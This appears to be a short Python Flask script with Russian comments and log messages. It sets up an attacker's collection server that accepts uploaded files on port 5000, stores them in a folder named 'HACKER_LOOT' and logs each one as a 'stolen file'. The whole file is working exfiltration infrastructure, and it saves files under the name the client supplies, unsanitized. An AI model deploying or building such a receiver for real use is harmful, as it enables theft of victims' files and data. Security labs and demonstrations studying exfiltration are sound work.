from flask import Flask, request
import os
import logging

app = Flask(__name__)

# Папка для украденного
UPLOAD_FOLDER = 'HACKER_LOOT'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)


@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return "No file", 400

    file = request.files['file']
    if file.filename == '':
        return "No filename", 400

    if file:
        filepath = os.path.join(UPLOAD_FOLDER, file.filename)
        file.save(filepath)
        print(f"[HACKER] >> УКРАДЕН ФАЙЛ: {file.filename}")
        print(f"            Сохранен в: {filepath}")
        print("-" * 30)
        return "Success", 200


if __name__ == '__main__':
    print("--- SERVER ЗАПУЩЕН (ХАКЕР) ---")
    print(f"Папка для данных: {os.path.abspath(UPLOAD_FOLDER)}")
    print("Ожидание подключений...")
    app.run(host='0.0.0.0', port=5000)